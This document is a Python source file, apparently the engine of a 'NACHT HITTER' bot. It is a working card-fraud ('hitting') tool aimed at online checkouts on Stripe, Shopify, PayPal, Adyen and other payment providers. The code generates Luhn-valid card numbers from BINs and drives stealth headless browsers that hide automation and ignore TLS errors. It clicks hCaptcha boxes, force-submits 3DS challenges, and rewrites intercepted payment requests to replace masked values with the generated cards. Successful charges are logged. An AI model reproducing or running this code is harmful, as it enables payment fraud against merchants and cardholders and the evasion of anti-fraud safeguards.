#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NACHT HITTER - Engine
Provides: URLAnalyzer, CardGenerator, HitterEngine and supporting classes.
Used exclusively by nacht_bot.py — not meant to be run directly.
"""

import re
import json
import time
import random
import sqlite3
import asyncio
import requests
import urllib3
from datetime import datetime
from typing import Dict, List, Optional
from collections import defaultdict
from playwright.async_api import async_playwright, Page, Route, Request

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Config ────────────────────────────────────────────────────────────────────
DATABASE = "nacht_hitter.db"
MAX_ATTEMPTS = 100
MAX_CONCURRENT = 3

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
]

# ── Provider Detection ────────────────────────────────────────────────────────
def detect_provider(url: str, html: str = "") -> str:
    u = url.lower()
    if "stripe.com" in u:                            return "stripe"
    if "checkout.com" in u or "checkout" in u:       return "checkoutcom"
    if "shopify.com" in u or "myshopify.com" in u:   return "shopify"
    if "paypal.com" in u or "paypal" in u:           return "paypal"
    if "braintree" in u or "braintreegateway" in u:  return "braintree"
    if "adyen.com" in u or "adyen" in u:             return "adyen"
    if "squareup.com" in u or "square" in u:         return "square"
    if "mollie.com" in u or "mollie" in u:           return "mollie"
    if "klarna.com" in u or "klarna" in u:           return "klarna"
    if "authorize.net" in u or "authorizenet" in u:  return "authorizenet"
    if html:
        h = html.lower()
        if "woocommerce" in h:    return "woocommerce"
        if "bigcommerce" in h:    return "bigcommerce"
        if "window.shopify" in h: return "shopify"
        if "stripe.com" in h:     return "stripe"
        if "braintree" in h:      return "braintree"
        if "adyen" in h:          return "adyen"
        if "paypal" in h:         return "paypal"
        if "mollie" in h:         return "mollie"
        if "klarna" in h:         return "klarna"
        if "authorize.net" in h:  return "authorizenet"
        if "square" in h:         return "square"
        if "wix" in h:            return "wix"
        if "ecwid" in h:          return "ecwid"
    return "unknown"

# ── Database ──────────────────────────────────────────────────────────────────
def init_db(db_path: str = DATABASE):
    conn = sqlite3.connect(db_path)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS hits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT, user_id INTEGER, card TEXT,
        merchant TEXT, product TEXT, amount TEXT,
        success INTEGER, decline_code TEXT,
        receipt_url TEXT, response_time REAL
    )""")
    conn.commit()
    conn.close()

# ── URL Analyzer ──────────────────────────────────────────────────────────────
class URLAnalyzer:
    @staticmethod
    def _from_scripts(html: str) -> Dict:
        out = {"amount": None, "product": None, "merchant": None, "product_url": None}
        for script in re.findall(r"<script[^>]*>(.*?)</script>", html, re.DOTALL):
            checks = [
                (r'window\.__STRIPE__\s*=\s*({.*?});',           "obj"),
                (r'window\.__INITIAL_STATE__\s*=\s*({.*?});',    "obj"),
                (r'var\s+stripePaymentData\s*=\s*({.*?});',      "obj"),
                (r'"paymentIntent":({.*?})',                       "obj"),
                (r'"amount":\s*(\d+)',                             "amount"),
                (r'"name":\s*"([^"]+)"',                          "name"),
                (r'"business_name":\s*"([^"]+)"',                 "business"),
                (r'"product_url":\s*"([^"]+)"',                   "product_url"),
            ]
            for pat, kind in checks:
                m = re.search(pat, script, re.DOTALL)
                if not m:
                    continue
                try:
                    if kind == "obj":
                        def _walk(obj):
                            if isinstance(obj, dict):
                                if isinstance(obj.get("amount"), (int, float)):
                                    out["amount"] = obj["amount"]
                                if isinstance(obj.get("name"), str):
                                    out["product"] = obj["name"]
                                if isinstance(obj.get("business_name"), str):
                                    out["merchant"] = obj["business_name"]
                                if isinstance(obj.get("product_url"), str):
                                    out["product_url"] = obj["product_url"]
                                for v in obj.values():
                                    _walk(v)
                            elif isinstance(obj, list):
                                for i in obj:
                                    _walk(i)
                        _walk(json.loads(m.group(1)))
                    elif kind == "amount":
                        out["amount"] = int(m.group(1))
                    elif kind == "name":
                        out["product"] = m.group(1)
                    elif kind == "business":
                        out["merchant"] = m.group(1)
                    elif kind == "product_url":
                        out["product_url"] = m.group(1)
                except Exception:
                    pass
        return out

    @staticmethod
    def extract_amount(html: str) -> Optional[str]:
        sd = URLAnalyzer._from_scripts(html)
        if sd.get("amount") is not None:
            v = sd["amount"]
            if isinstance(v, (int, float)):
                return f"${v/100:.2f}"
        for pat in [
            r'"amount":(\d+)', r'"amount_display":"([^"]+)"',
            r'\$(\d+(?:\.\d{2})?)', r'data-amount="(\d+)"',
            r'Total:?\s*[\$€£]?\s*([\d,]+\.?\d*)',
            r'"amount_subtotal":(\d+)', r'"total":(\d+)',
        ]:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                a = m.group(1).replace(",", "")
                if a.isdigit() and len(a) > 2:
                    return f"${int(a)/100:.2f}"
                if a.replace(".", "").isdigit():
                    return f"${a}"
        return None

    @staticmethod
    def extract_product_name(html: str) -> Optional[str]:
        sd = URLAnalyzer._from_scripts(html)
        if sd.get("product"):
            return sd["product"]
        for pat in [
            r'"name":"([^"]+)"', r"<title>(.*?)</title>",
            r"<h1[^>]*>(.*?)</h1>", r'"product_name":"([^"]+)"',
            r'<meta property="og:title" content="([^"]+)"',
        ]:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                name = re.sub(r'\s*[|–-]\s*(Stripe|Checkout).*$', '', m.group(1).strip(), flags=re.IGNORECASE)
                if name and len(name) > 3:
                    return name[:100]
        return None

    @staticmethod
    def extract_merchant(html: str) -> str:
        sd = URLAnalyzer._from_scripts(html)
        if sd.get("merchant"):
            return sd["merchant"]
        for pat in [
            r'"business_name":"([^"]+)"',
            r'<title>(.*?)\s*[|–-]\s*(?:Stripe|Checkout|Shopify|PayPal|Braintree|Adyen|Square|Mollie|Klarna|Authorize\.Net|WooCommerce|BigCommerce|Wix|Ecwid)',
            r'"display_name":"([^"]+)"',
            r'<meta property="og:site_name" content="([^"]+)"',
        ]:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                return m.group(1).strip()
        return "Unknown"

    @staticmethod
    def extract_currency(html: str) -> str:
        for pat in [r'"currency":"([^"]+)"', r'data-currency="([^"]+)"']:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                return m.group(1).upper()
        return "USD"

    @staticmethod
    def extract_product_url(html: str) -> Optional[str]:
        sd = URLAnalyzer._from_scripts(html)
        if sd.get("product_url"):
            return sd["product_url"]
        for pat in [
            r'<meta property="og:url" content="([^"]+)"',
            r'<link rel="canonical" href="([^"]+)"',
        ]:
            m = re.search(pat, html, re.IGNORECASE)
            if m and m.group(1).startswith("http"):
                return m.group(1).strip()
        return None

    @staticmethod
    async def analyze(url: str, use_playwright: bool = False) -> Dict:
        result: Dict = {
            "url": url, "merchant": "Unknown", "product": "Unknown",
            "product_url": None, "amount": None, "currency": "USD",
            "success": False, "error": None,
        }
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS), "Accept-Language": "en-US,en;q=0.9"}
            r = requests.get(url, timeout=15, verify=False, headers=headers, allow_redirects=True)
            if r.status_code == 200:
                html = r.text
                result.update({
                    "merchant":    URLAnalyzer.extract_merchant(html),
                    "product":     URLAnalyzer.extract_product_name(html) or "Unknown",
                    "product_url": URLAnalyzer.extract_product_url(html),
                    "amount":      URLAnalyzer.extract_amount(html),
                    "currency":    URLAnalyzer.extract_currency(html),
                    "success":     True,
                })
            else:
                result["error"] = f"HTTP {r.status_code}"
        except Exception as e:
            result["error"] = str(e)

        needs_deep = (
            use_playwright and
            (result["merchant"] == "Unknown" or
             result["product"] in ("Unknown", "Stripe Checkout", "Checkout", "Shopify Checkout"))
        )
        if needs_deep:
            deep = await URLAnalyzer._playwright_analyze(url)
            if deep.get("success"):
                if deep["merchant"] != "Unknown": result["merchant"] = deep["merchant"]
                if deep["product"] != "Unknown":  result["product"]  = deep["product"]
                if deep.get("product_url"):        result["product_url"] = deep["product_url"]
                if deep.get("amount"):             result["amount"]   = deep["amount"]
                if deep.get("currency") != "USD":  result["currency"] = deep["currency"]
        return result

    @staticmethod
    async def _playwright_analyze(url: str) -> Dict:
        out: Dict = {
            "merchant": "Unknown", "product": "Unknown",
            "product_url": None, "amount": None, "currency": "USD", "success": False,
        }
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,
                    args=["--disable-blink-features=AutomationControlled", "--no-sandbox"],
                )
                ctx = await browser.new_context(ignore_https_errors=True)
                page = await ctx.new_page()
                await page.goto(url, timeout=60000, wait_until="domcontentloaded")
                await asyncio.sleep(3)

                merchant = await page.evaluate(r"""() => {
                    const m = document.querySelector('meta[property="og:site_name"]');
                    if (m) return m.content;
                    const t = document.title;
                    const x = t.match(/(.+?)\s*[|\u2013-]\s*(Stripe|Checkout|Shopify|PayPal|Braintree|Adyen|Square|Mollie|Klarna|Authorize\.Net|WooCommerce|BigCommerce|Wix|Ecwid)/);
                    return x ? x[1] : t;
                }""")
                if merchant and merchant not in ("Stripe Checkout", "Checkout", "Shopify Checkout", "PayPal"):
                    out["merchant"] = merchant.strip()

                product = await page.evaluate(r"""() => {
                    const m = document.querySelector('meta[property="og:title"]');
                    if (m) return m.content;
                    const h = document.querySelector('h1');
                    return h ? h.innerText : document.title;
                }""")
                if product and product not in ("Stripe Checkout", "Checkout", "Shopify Checkout"):
                    out["product"] = product.strip()

                product_url = await page.evaluate(r"""() => {
                    const m = document.querySelector('meta[property="og:url"]');
                    if (m) return m.content;
                    const l = document.querySelector('link[rel="canonical"]');
                    return l ? l.href : null;
                }""")
                if product_url:
                    out["product_url"] = product_url

                amount_text = await page.evaluate(r"""() => {
                    for (let sel of ['[data-amount]','.amount','.price','[class*="amount"]','[class*="price"]']) {
                        const el = document.querySelector(sel);
                        if (el) { const t = el.innerText || el.getAttribute('data-amount'); if (t) return t; }
                    }
                    return null;
                }""")
                if amount_text:
                    am = re.search(r"[\$€£]?\s*([\d,]+\.?\d*)", amount_text)
                    if am:
                        out["amount"] = f"${am.group(1).replace(',', '')}"

                currency = await page.evaluate(r"""() => {
                    const m = document.querySelector('meta[property="og:price:currency"]');
                    if (m) return m.content;
                    const el = document.querySelector('[data-currency]');
                    return el ? el.getAttribute('data-currency') : null;
                }""")
                if currency:
                    out["currency"] = currency.upper()

                out["success"] = True
                await browser.close()
        except Exception as e:
            out["error"] = str(e)
        return out

# ── Card Generator ────────────────────────────────────────────────────────────
class CardGenerator:
    @staticmethod
    def brand(num: str) -> str:
        n = re.sub(r"\D", "", num)[:6]
        if re.match(r"^3[47]", n):               return "amex"
        if re.match(r"^5[1-5]", n) or re.match(r"^2[2-7]", n): return "mastercard"
        if re.match(r"^4", n):                   return "visa"
        return "unknown"

    @staticmethod
    def luhn_ok(num: str) -> bool:
        digits = [int(d) for d in num]
        odd = digits[-1::-2]
        even = digits[-2::-2]
        cs = sum(odd) + sum(sum(divmod(d * 2, 10)) for d in even)
        return cs % 10 == 0

    @staticmethod
    def generate(bin_str: str) -> Optional[Dict]:
        if not bin_str or len(bin_str) < 4:
            return None
        parts = bin_str.split("|")
        raw = re.sub(r"[^0-9xX]", "", parts[0])
        test = raw.replace("x", "0").replace("X", "0")
        b = CardGenerator.brand(test)
        tlen = 15 if b == "amex" else 16
        cvvlen = 4 if b == "amex" else 3

        card = "".join(str(random.randint(0, 9)) if c.lower() == "x" else c for c in raw)
        card += "".join(str(random.randint(0, 9)) for _ in range(tlen - len(card) - 1))
        check = next((i for i in range(10) if CardGenerator.luhn_ok(card + str(i))), 0)
        full = card + str(check)

        month = f"{random.randint(1,12):02d}"
        if len(parts) > 1 and parts[1] and parts[1].lower() != "xx":
            month = parts[1].zfill(2)

        year = f"{(datetime.now().year + random.randint(1, 5)) % 100:02d}"
        if len(parts) > 2 and parts[2] and parts[2].lower() != "xx":
            year = parts[2].zfill(2)

        cvv = "".join(str(random.randint(0, 9)) for _ in range(cvvlen))
        if len(parts) > 3 and parts[3] and parts[3].lower() not in ("xxx", "xxxx"):
            cvv = parts[3].zfill(cvvlen)

        return {"card": full, "month": month, "year": year, "cvv": cvv, "brand": b}

    @staticmethod
    def generate_many(bin_str: str, count: int) -> List[Dict]:
        return [c for _ in range(count) if (c := CardGenerator.generate(bin_str))]

    @staticmethod
    def parse(s: str) -> Optional[Dict]:
        p = s.strip().split("|")
        if len(p) == 4:
            return {
                "card": p[0].strip(), "month": p[1].strip().zfill(2),
                "year": p[2].strip().zfill(2), "cvv": p[3].strip(),
                "brand": CardGenerator.brand(p[0].strip()),
            }
        return None

# ── Fingerprint ───────────────────────────────────────────────────────────────
class Fingerprint:
    @staticmethod
    def generate() -> Dict:
        return {
            "user_agent": random.choice(USER_AGENTS),
            "viewport":   {"width": 1920, "height": 1080},
            "locale":     "en-US",
            "timezone_id":"America/New_York",
        }

    STEALTH = """
        Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
        window.chrome={runtime:{}};
        Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});
    """

# ── Smart Rate Limiter ────────────────────────────────────────────────────────
class RateLimiter:
    def __init__(self):
        self.delay = 1.0
        self.failures = 0

    def next(self, success: bool) -> float:
        if success:
            self.failures = 0
            self.delay = max(0.5, self.delay * 0.9)
        else:
            self.failures += 1
            self.delay = min(8.0, self.delay * 1.2 + self.failures * 0.2)
        return max(0.5, min(10.0, self.delay))

# ── Base Autofill ─────────────────────────────────────────────────────────────
class BaseAutofill:
    CARD_SEL: List[str] = []
    EXP_SEL:  List[str] = []
    CVC_SEL:  List[str] = []
    NAME_SEL: List[str] = []
    EMAIL_SEL:List[str] = []
    SUBMIT_SEL: List[str] = []
    MASKED_CARD   = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV    = "123"

    def __init__(self, page: Page):
        self.page = page
        self._card: Optional[Dict] = None

    async def _fill(self, selectors: List[str], value: str) -> bool:
        for sel in selectors:
            try:
                el = await self.page.query_selector(sel)
                if el and await el.is_visible():
                    await el.click()
                    await el.fill(value)
                    return True
            except Exception:
                pass
        return False

    async def setup_intercept(self, real_card: Dict):
        self._card = real_card

    async def fill(self, card: Dict):
        await self._fill(self.CARD_SEL,   self.MASKED_CARD)
        await self._fill(self.EXP_SEL,    self.MASKED_EXPIRY)
        await self._fill(self.CVC_SEL,    self.MASKED_CVV)
        await self._fill(self.NAME_SEL,   "NACHT HITTER")
        await self._fill(self.EMAIL_SEL,  f"nacht{random.randint(100,9999)}@example.com")

    async def submit(self) -> bool:
        for sel in self.SUBMIT_SEL:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except Exception:
                pass
        return False

    async def detect_3ds(self) -> bool:
        for iframe in await self.page.query_selector_all('iframe[src*="3ds"],iframe[src*="challenge"]'):
            if await iframe.is_visible():
                return True
        body = await self.page.text_content("body") or ""
        return "3D Secure" in body or "Authentication" in body

    async def wait_3ds(self, ms: int = 10000) -> bool:
        t = time.time()
        while (time.time() - t) * 1000 < ms:
            if await self.detect_3ds():
                return True
            await asyncio.sleep(0.5)
        return False

    async def complete_3ds(self):
        if not await self.detect_3ds():
            return
        form = await self.page.query_selector("form")
        if form:
            await form.evaluate("f=>f.submit()")
            await asyncio.sleep(3)
            return
        btn = await self.page.query_selector('button:has-text("Continue"),button:has-text("Submit")')
        if btn:
            await btn.click()
            await asyncio.sleep(3)

    async def handle_captcha(self):
        try:
            frame = self.page.frame_locator('iframe[src*="hcaptcha.com"]')
            cb = frame.locator("#checkbox").first
            if await cb.is_visible():
                await cb.click()
                await asyncio.sleep(2)
        except Exception:
            pass

# ── Provider Autofill classes ─────────────────────────────────────────────────

class StripeAutofill(BaseAutofill):
    CARD_SEL = [
        "#cardNumber","[name='cardNumber']","[autocomplete='cc-number']",
        "[data-elements-stable-field-name='cardNumber']",
        "input[placeholder*='Card number']","input[aria-label*='Card number']",
        "[class*='CardNumberInput'] input","input[name='number']",
    ]
    EXP_SEL = [
        "#cardExpiry","[name='cardExpiry']","[autocomplete='cc-exp']",
        "[data-elements-stable-field-name='cardExpiry']",
        "input[placeholder*='MM / YY']","input[placeholder*='MM/YY']",
        "[class*='CardExpiry'] input",
    ]
    CVC_SEL = [
        "#cardCvc","[name='cardCvc']","[autocomplete='cc-csc']",
        "[data-elements-stable-field-name='cardCvc']",
        "input[placeholder*='CVC']","input[placeholder*='CVV']",
        "[class*='CardCvc'] input","input[name='cvc']",
    ]
    NAME_SEL  = ["#billingName","[name='billingName']","[autocomplete='cc-name']","input[placeholder*='Name on card']"]
    EMAIL_SEL = ["input[type='email']","input[name*='email']","input[autocomplete='email']"]
    SUBMIT_SEL= [".SubmitButton","[class*='SubmitButton']","button[type='submit']","button:has-text('Pay')"]
    MASKED_CARD   = "0000000000000000"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV    = "000"

    async def setup_intercept(self, real_card: Dict):
        self._card = real_card
        async def route_fn(route: Route, request: Request):
            if request.method == "POST" and "stripe.com" in request.url:
                pd = request.post_data or ""
                if self._card:
                    pd = pd.replace("card[number]=0000000000000000", f"card[number]={self._card['card']}")
                    pd = pd.replace("card[exp_month]=01",            f"card[exp_month]={self._card['month']}")
                    pd = pd.replace("card[exp_year]=30",             f"card[exp_year]={self._card['year']}")
                    pd = pd.replace("card[cvc]=000",                 f"card[cvc]={self._card['cvv']}")
                    pd = pd.replace("card[expiry]=01/30",            f"card[expiry]={self._card['month']}/{self._card['year']}")
                    await route.continue_(post_data=pd); return
            await route.continue_()
        await self.page.route("**/*", route_fn)


def _make_generic(provider_domains: List[str], extra_replace=None):
    """Factory: returns a BaseAutofill subclass that intercepts POST to given domains."""
    class Generic(BaseAutofill):
        CARD_SEL = [
            "#cardNumber","input[name='cardNumber']","#card-number","input[name='card_number']",
            "input[name='x_card_num']","[autocomplete='cc-number']",
            "input[placeholder*='Card number']","input[aria-label*='Card number']",
            "#wc-stripe-card-number",".card-number","#credit-card-number",
            "input[data-frames='card-number']","input[data-braintree-name='number']",
            "#number","input[name='number']",
        ]
        EXP_SEL = [
            "#expiryDate","input[name='expiryDate']","#expiry-date","input[name='expiry']",
            "input[name='x_exp_date']","[autocomplete='cc-exp']","input[placeholder*='MM/YY']",
            "#cardExpiry","input[name='expDate']","#expiry","input[name='expirydate']",
            "input[data-frames='expiry-date']","input[data-braintree-name='expiration_date']",
            "#expiration-date",
        ]
        CVC_SEL = [
            "#cvv","input[name='cvv']","input[name='x_card_code']","[autocomplete='cc-csc']",
            "input[placeholder*='CVC']","input[placeholder*='CVV']","input[aria-label*='Security']",
            "#wc-stripe-cvc","#cvc","input[name='cvc']","input[data-frames='cvv']",
            "input[data-braintree-name='cvv']","#verification_value","input[name='verification_value']",
        ]
        NAME_SEL = [
            "#cardholderName","input[name='cardholderName']","input[name='x_card_name']",
            "[autocomplete='cc-name']","input[placeholder*='Name on card']",
            "input[name='cardholder_name']","#cardholder-name","#billingName",
        ]
        EMAIL_SEL = [
            "input[type='email']","#email","input[name='email']",
            "#billing_email","input[name='billing_email']","input[placeholder*='email']",
        ]
        SUBMIT_SEL = [
            "button[type='submit']",".pay-button","[data-testid='pay-button']",
            "#place_order","button:has-text('Pay')","button:has-text('Submit')",
            "button:has-text('Place order')","button:has-text('Complete order')",
            "button:has-text('Pay Now')",".SubmitButton",
        ]
        _domains = provider_domains
        _extra   = extra_replace or []

        async def setup_intercept(self, real_card: Dict):
            self._card = real_card
            async def route_fn(route: Route, request: Request):
                if request.method == "POST":
                    if any(d in request.url for d in self._domains):
                        pd = request.post_data or ""
                        if self._card:
                            pd = pd.replace(self.MASKED_CARD,          self._card["card"])
                            pd = pd.replace(self.MASKED_EXPIRY[:2],    self._card["month"])
                            pd = pd.replace(self.MASKED_EXPIRY[3:5],   self._card["year"])
                            pd = pd.replace(self.MASKED_CVV,           self._card["cvv"])
                            for old, new_tpl in self._extra:
                                import re as _re
                                pd = _re.sub(old, new_tpl.format(**self._card), pd)
                            await route.continue_(post_data=pd); return
                await route.continue_()
            await self.page.route("**/*", route_fn)
    return Generic


CheckoutComAutofill   = _make_generic(["checkout.com", "api.checkout.com"])
ShopifyAutofill       = _make_generic(["shopify.com", "myshopify.com", "stripe.com"], [
    (r"credit_card\[number\]=4242424242424242", "credit_card[number]={card}"),
    (r"credit_card\[month\]=01",               "credit_card[month]={month}"),
    (r"credit_card\[year\]=30",                "credit_card[year]={year}"),
    (r"credit_card\[verification_value\]=123", "credit_card[verification_value]={cvv}"),
])
PayPalAutofill        = _make_generic(["paypal.com", "braintreegateway.com"])
BraintreeAutofill     = _make_generic(["braintreegateway.com", "braintree"])
AdyenAutofill         = _make_generic(["adyen.com", "checkoutshopper"])
SquareAutofill        = _make_generic(["squareup.com", "square"])
MollieAutofill        = _make_generic(["mollie.com", "api.mollie.com"])
KlarnaAutofill        = _make_generic(["klarna.com", "api.klarna.com"])
AuthorizeNetAutofill  = _make_generic(["authorize.net", "authorizenet"])
WooCommerceAutofill   = _make_generic(["woocommerce", "wc-api"])
BigCommerceAutofill   = _make_generic(["bigcommerce.com", "bigcommerce"])
WixAutofill           = _make_generic(["wix.com"])
EcwidAutofill         = _make_generic(["ecwid.com"])

AUTOFILL_MAP = {
    "stripe":       StripeAutofill,
    "checkoutcom":  CheckoutComAutofill,
    "shopify":      ShopifyAutofill,
    "paypal":       PayPalAutofill,
    "braintree":    BraintreeAutofill,
    "adyen":        AdyenAutofill,
    "square":       SquareAutofill,
    "mollie":       MollieAutofill,
    "klarna":       KlarnaAutofill,
    "authorizenet": AuthorizeNetAutofill,
    "woocommerce":  WooCommerceAutofill,
    "bigcommerce":  BigCommerceAutofill,
    "wix":          WixAutofill,
    "ecwid":        EcwidAutofill,
}

# ── Hitter Engine ─────────────────────────────────────────────────────────────
class HitterEngine:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy      = proxy
        self.results:   List[Dict] = []
        self.successes  = 0
        self.fails      = 0
        self._sem       = asyncio.Semaphore(MAX_CONCURRENT)

    async def hit(self, url: str, card: Dict, merchant: str,
                  product: str, amount: str, attempt: int) -> Dict:
        async with self._sem:
            return await self._hit(url, card, merchant, product, amount, attempt)

    async def _hit(self, url: str, card: Dict, merchant: str,
                   product: str, amount: str, attempt: int) -> Dict:
        t0 = time.time()
        res: Dict = {
            "attempt": attempt, "card": card,
            "success": False, "decline_code": None,
            "receipt_url": None, "response_time": 0, "error": None,
        }
        try:
            async with async_playwright() as pw:
                fp = Fingerprint.generate()
                args = ["--disable-blink-features=AutomationControlled", "--no-sandbox"]
                if self.proxy:
                    args.append(f"--proxy-server={self.proxy}")
                browser = await pw.chromium.launch(headless=True, args=args)
                ctx = await browser.new_context(
                    user_agent=fp["user_agent"], viewport=fp["viewport"],
                    locale=fp["locale"], timezone_id=fp["timezone_id"],
                    ignore_https_errors=True,
                )
                page = await ctx.new_page()
                await page.add_init_script(Fingerprint.STEALTH)
                await page.goto(url, timeout=60000, wait_until="domcontentloaded")
                await asyncio.sleep(3)

                provider = detect_provider(url, await page.content())
                af_cls = AUTOFILL_MAP.get(provider)
                if not af_cls:
                    res["error"] = f"Unsupported provider: {provider}"
                    await browser.close()
                    return res

                af = af_cls(page)
                await af.handle_captcha()
                await af.setup_intercept(card)
                await af.fill(card)
                if not await af.submit():
                    res["error"] = "Submit button not found"
                    await browser.close()
                    return res

                await asyncio.sleep(5)
                if await af.wait_3ds(10000):
                    await af.complete_3ds()
                    await asyncio.sleep(5)
                await af.handle_captcha()

                res["response_time"] = time.time() - t0
                cur = page.url.lower()
                if any(k in cur for k in ("receipt", "thank_you", "success", "order_confirmation", "complete")):
                    res["success"] = True
                    res["receipt_url"] = page.url
                    self.successes += 1
                else:
                    body = (await page.text_content("body") or "").lower()
                    res["decline_code"] = "card_declined" if "declined" in body else "unknown"
                    self.fails += 1

                await browser.close()
        except Exception as e:
            res["error"] = str(e)
            res["decline_code"] = "exception"
            res["response_time"] = time.time() - t0

        self.results.append(res)
        return res
